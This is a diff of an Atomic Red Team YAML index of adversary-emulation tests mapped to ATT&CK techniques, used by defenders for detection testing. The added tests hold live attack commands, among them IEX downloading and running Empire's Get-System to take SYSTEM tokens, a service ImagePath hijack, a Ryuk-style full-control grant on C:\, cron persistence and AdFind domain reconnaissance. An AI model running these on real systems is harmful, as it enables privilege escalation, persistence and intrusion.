-        copy /Y C:\temp\payload.exe C:\ProgramData\folder\Update\weakpermissionfile.exe   ( replace weak permission file with malicious file )
-
-        Upon execution, open the weak permission file at %temp%\T1574.010_weak_permission_file.txt and verify that it's contents read "T1574.010 Malicious file". To verify
-        the weak file permissions, open File Explorer to%temp%\T1574.010_weak_permission_file.exe then open Properties and Security to view the Full Control permission is enabled.
-      supported_platforms:
-      - windows
-      input_arguments:
-        malicious_file:
-          description: File to replace weak permission file with
-          type: path
-          default: "$env:TEMP\\T1574.010\\T1574.010_malicious_file.txt"
-        weak_permission_file:
-          description: check weak files permission
-          type: path
-          default: "$env:TEMP\\T1574.010_weak_permission_file.txt"
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'A file must exist on disk at specified location (#{weak_permission_file})
-
-'
-        prereq_command: 'if (Test-Path #{weak_permission_file}) {exit 0} else {exit
-          1}
-
-'
-        get_prereq_command: |
-          New-Item #{weak_permission_file} -Force | Out-Null
-          Set-Content -Path #{weak_permission_file} -Value " T1574.010 Weak permission file"
-      - description: 'A file to replace the original weak_permission_file. In an attack
-          this would be the malicious file gaining extra privileges
-
-'
-        prereq_command: 'if (Test-Path #{malicious_file}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory -Path $env:TEMP\T1574.010\ -Force | Out-Null
-          New-Item #{malicious_file} -Force | Out-Null
-          Set-Content -Path #{malicious_file} -Value " T1574.010 Malicious file"
-      executor:
-        command: |
-          Get-WmiObject win32_service | select PathName
-          Copy-Item #{malicious_file} -Destination #{weak_permission_file} -Force
-        cleanup_command: |
-          Remove-Item #{weak_permission_file} -Force -ErrorAction Ignore
-          Remove-Item -Recurse (Split-Path #{malicious_file}) -Force -ErrorAction Ignore
-        name: powershell
+    atomic_tests: []
   T1574.011:
     technique:
       external_references:
@@ -32737,9 +34121,9 @@ defense-evasion:
     atomic_tests:
     - name: Service Registry Permissions Weakness
       auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
-      description: "Service registry permissions weakness check and then which can
-        lead to privilege escalation with ImagePath. eg. \nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\"
-        /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n"
+      description: |
+        Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.
+        reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /v ImagePath /d "C:\temp\AtomicRedteam.exe"
       supported_platforms:
       - windows
       input_arguments:
@@ -32752,6 +34136,48 @@ defense-evasion:
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
           get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
         name: powershell
+    - name: Service ImagePath Change with reg.exe
+      auto_generated_guid: f38e9eea-e1d7-4ba6-b716-584791963827
+      description: 'Change Service registry ImagePath of a bengin service to a malicious
+        file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        weak_service_name:
+          description: weak service name
+          type: String
+          default: calcservice
+        weak_service_path:
+          description: weak service path
+          type: String
+          default: "%windir%\\system32\\win32calc.exe"
+        malicious_service_path:
+          description: malicious service path
+          type: String
+          default: "%windir%\\system32\\cmd.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'The service must exist (#{weak_service_name})
+
+'
+        prereq_command: 'if (Get-Service #{weak_service_name}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"
+
+'
+      executor:
+        command: 'reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
+          /f /v ImagePath /d "#{malicious_service_path}"
+
+'
+        cleanup_command: 'sc.exe delete #{weak_service_name}
+
+'
+        name: command_prompt
   T1548.001:
     technique:
       external_references:
@@ -33072,7 +34498,7 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: '#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
+        command: '"#{microsoft_wordpath}\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
 
 '
   T1216:
@@ -33690,7 +35116,60 @@ defense-evasion:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1542.001:
     technique:
       id: attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada
@@ -34364,7 +35843,34 @@ defense-evasion:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1205:
     technique:
       revoked: false
@@ -35070,7 +36576,7 @@ defense-evasion:
           default: Everyone
       dependency_executor_name: command_prompt
       dependencies:
-      - description: 'Test requrires a file to modifyto be located at (#{file_or_folder})
+      - description: 'Test requrires a file to modify to be located at (#{file_or_folder})
 
 '
         prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
@@ -35081,7 +36587,7 @@ defense-evasion:
           echo T1222.001_cacls1 >> #{file_or_folder}\T1222.001_cacls1.txt
           echo T1222.001_cacls2 >> #{file_or_folder}\T1222.001_cacls2.txt
       executor:
-        command: 'Icacls.exe #{file_or_folder} /grant #{user_or_group}:F
+        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
 '
         name: command_prompt
@@ -35116,6 +36622,49 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: attrib - hide file
+      auto_generated_guid: 32b979da-7b68-42c9-9a99-0e39900fc36c
+      description: |
+        Attackers leverage an existing Windows binary, attrib.exe, to mark specific files or folder as hidden by using specific flags so that
+        the victim does not see the file.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_or_folder:
+          description: Path of the file or folder remove attribute.
+          type: path
+          default: "%temp%\\T1222.001_attrib_2"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: 'Test requires a file to modify to be located at (#{file_or_folder})
+
+'
+        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: |
+          mkdir #{file_or_folder}
+          echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
+          echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
+      executor:
+        command: |
+          attrib.exe +h #{file_or_folder}\T1222.001_attrib1.txt
+          attrib.exe +h #{file_or_folder}\T1222.001_attrib2.txt
+        cleanup_command: |
+          attrib.exe -h #{file_or_folder}\T1222.001_attrib1.txt
+          attrib.exe -h #{file_or_folder}\T1222.001_attrib2.txt
+          del #{file_or_folder}\T1222.001_attrib*.txt
+          rmdir #{file_or_folder}
+        name: command_prompt
+    - name: Grant Full Access to Entire C:\ Drive for Everyone - Ryuk Ransomware Style
+      auto_generated_guid: ac7e6118-473d-41ec-9ac0-ef4f1d1ed2f6
+      description: Invokes the command line used by Ryuk Ransomware to grant full
+        access to the entire C:\ drive for Everyone.
+      supported_platforms:
+      - windows
+      executor:
+        command: icacls "C:\*" /grant Everyone:F /T /C /Q
+        name: powershell
   T1220:
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
@@ -37676,6 +39225,17 @@ discovery:
 
 '
         name: command_prompt
+    - name: List Internet Explorer Bookmarks using the command prompt
+      auto_generated_guid: 727dbcdb-e495-4ab1-a6c4-80c7f77aef85
+      description: This test will list the bookmarks for Internet Explorer that are
+        found in the Favorites folder
+      supported_platforms:
+      - windows
+      executor:
+        command: 'dir /s /b %USERPROFILE%\Favorites
+
+'
+        name: command_prompt
   T1087.004:
     technique:
       external_references:
@@ -38040,13 +39600,122 @@ discovery:
         reference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
       supported_platforms:
       - windows
-      executor:
-        command: 'PathToAtomicsFolder\T1087.002\src\AdFind -default -s base lockoutduration
-          lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength
-          pwdhistorylength pwdproperties
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
 
 '
-        name: powershell
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -default -s base lockoutduration lockoutthreshold
+          lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength
+          pwdproperties\n"
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Admins
+      auto_generated_guid: b95fd967-4e62-4109-b48d-265edfd28c3a
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -sc admincountdmp\n"
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory User Objects
+      auto_generated_guid: e1ec8d20-509a-4b9a-b820-06c9b2da8eb7
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -f (objectcategory=person)\n"
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Exchange AD Objects
+      auto_generated_guid: 5e2938fb-f919-47b6-8b29-2f6a1f718e99
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -sc exchaddresses\n"
+        name: command_prompt
+    - name: Enumerate Default Domain Admin Details (Domain)
+      auto_generated_guid: c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef
+      description: 'This test will enumerate the details of the built-in domain admin
+        account
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'net user administrator /domain
+
+'
+        name: command_prompt
   T1069.002:
     technique:
       external_references:
@@ -38098,6 +39767,7 @@ discovery:
           net localgroup
           net group /domain
           net group "domain admins" /domain
+          net group "enterprise admins" /domain
         name: command_prompt
     - name: Permission Groups Discovery PowerShell (Domain)
       auto_generated_guid: 6d5d8c96-3d2a-4da9-9d6d-9a9d341899a7
@@ -38215,6 +39885,33 @@ discovery:
           -eq $TRUE}
 
 '
+    - name: Adfind - Query Active Directory Groups
+      auto_generated_guid: 48ddc687-82af-40b7-8472-ff1e742e8274
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -f (objectcategory=group)\n"
+        name: command_prompt
   T1482:
     technique:
       created: '2019-02-14T16:15:05.974Z'
@@ -38362,6 +40059,60 @@ discovery:
           Get-ADDomain
           Get-ADGroupMember Administrators -Recursive
         name: powershell
+    - name: Adfind - Enumerate Active Directory OUs
+      auto_generated_guid: d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -f (objectcategory=organizationalUnit)\n"
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Trusts
+      auto_generated_guid: 15fe436d-e771-4ff3-b655-2dca9ba52834
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -gcb -sc trustdmp\n"
+        name: command_prompt
   T1087.003:
     technique:
       external_references:
@@ -38654,7 +40405,7 @@ discovery:
       - linux
       - macos
       executor:
-        command: 'username=$(echo $HOME | awk -F''/'' ''{print $3}'') && lsof -u $username
+        command: 'username=$(id -u -n) && lsof -u $username
 
 '
         name: sh
@@ -39706,17 +41457,11 @@ discovery:
       auto_generated_guid: 8f7578c4-9863-4d83-875c-a565573bbdf0
       description: |
         Query Windows Registry.
-
         Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).
-
         References:
-
         https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
-
         https://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services
-
         http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf
-
         https://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf
       supported_platforms:
       - windows
@@ -40026,6 +41771,60 @@ discovery:
 '
         name: command_prompt
         elevation_required: true
+    - name: Adfind - Enumerate Active Directory Computer Objects
+      auto_generated_guid: a889f5be-2d54-4050-bd05-884578748bb4
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -f (objectcategory=computer)\n"
+        name: command_prompt
+    - name: Adfind - Enumerate Active Directory Domain Controller Objects
+      auto_generated_guid: 5838c31e-a0e2-4b9f-b60a-d79d2cb7995e
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -sc dclist\n"
+        name: command_prompt
   T1518.001:
     technique:
       external_references:
@@ -40328,7 +42127,60 @@ discovery:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1082:
     technique:
       created: '2017-05-31T21:31:04.307Z'
@@ -40669,6 +42521,46 @@ discovery:
 
 '
         name: powershell
+    - name: Adfind - Enumerate Active Directory Subnet Objects
+      auto_generated_guid: 9bb45dd7-c466-4f93-83a1-be30e56033ee
+      description: |
+        Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects
+        reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfind_path:
+          description: Path to the AdFind executable
+          type: Path
+          default: PathToAtomicsFolder\T1087.002\src\AdFind.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AdFind.exe must exist on disk at specified location (#{adfind_path})
+
+'
+        prereq_command: 'if (Test-Path #{adfind_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe"
+          -OutFile #{adfind_path}
+
+'
+      executor:
+        command: "#{adfind_path} -f (objectcategory=subnet)\n"
+        name: command_prompt
+    - name: Qakbot Recon
+      auto_generated_guid: 121de5c6-5818-4868-b8a7-8fd07c455c1b
+      description: A list of commands known to be performed by Qakbot for recon purposes
+      supported_platforms:
+      - windows
+      input_arguments:
+        recon_commands:
+          description: File that houses list of commands to be executed
+          type: Path
+          default: PathToAtomicsFolder\T1016\src\qakbot.bat
+      executor:
+        command: "#{recon_commands}\n"
+        name: command_prompt
   T1049:
     technique:
       object_marking_refs:
@@ -40854,7 +42746,7 @@ discovery:
           quser
           qwinsta.exe /server:#{computer_name}
           qwinsta.exe
-          for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
+          for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
           @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
         name: command_prompt
     - name: System Owner/User Discovery
@@ -41797,14 +43689,18 @@ execution:
           default: "/tmp/persistevil"
       executor:
         name: bash
-        command: 'echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        command: |
+          crontab -l > /tmp/notevil
+          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+        cleanup_command: 'crontab /tmp/notevil
 
 '
-    - name: Cron - Add script to cron folder
+    - name: Cron - Add script to all cron subfolders
       auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
-      description: 'This test adds a script to a cron folder configured to execute
-        on a schedule. This technique was used by the threat actor Rocke during the
-        exploitation of Linux web servers.
+      description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
+        /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a
+        schedule. This technique was used by the threat actor Rocke during the exploitation
+        of Linux web servers.
 
 '
       supported_platforms:
@@ -41822,7 +43718,43 @@ execution:
       executor:
         elevation_required: true
         name: bash
-        command: echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+        command: |
+          echo "#{command}" > /etc/cron.daily/#{cron_script_name}
+          echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
+          echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
+        cleanup_command: |
+          rm /etc/cron.daily/#{cron_script_name}
+          rm /etc/cron.hourly/#{cron_script_name}
+          rm /etc/cron.monthly/#{cron_script_name}
+          rm /etc/cron.weekly/#{cron_script_name}
+    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
+      auto_generated_guid: 2d943c18-e74a-44bf-936f-25ade6cccab4
+      description: 'This test adds a script to a /var/spool/cron/crontabs folder configured
+        to execute on a schedule. This technique was used by the threat actor Rocke
+        during the exploitation of Linux web servers.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        command:
+          description: Command to execute
+          type: string
+          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
+        cron_script_name:
+          description: Name of file to store in /var/spool/cron/crontabs folder
+          type: string
+          default: persistevil
+      executor:
+        elevation_required: true
+        name: bash
+        command: 'echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
+
+'
+        cleanup_command: 'rm /var/spool/cron/crontabs/#{cron_script_name}
+
+'
   T1559.002:
     technique:
       created: '2020-02-12T14:10:50.699Z'
@@ -42374,8 +44306,7 @@ execution:
       description: |
         This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-
-        This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
+        This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
         References:
           https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
       supported_platforms:
@@ -42391,31 +44322,30 @@ execution:
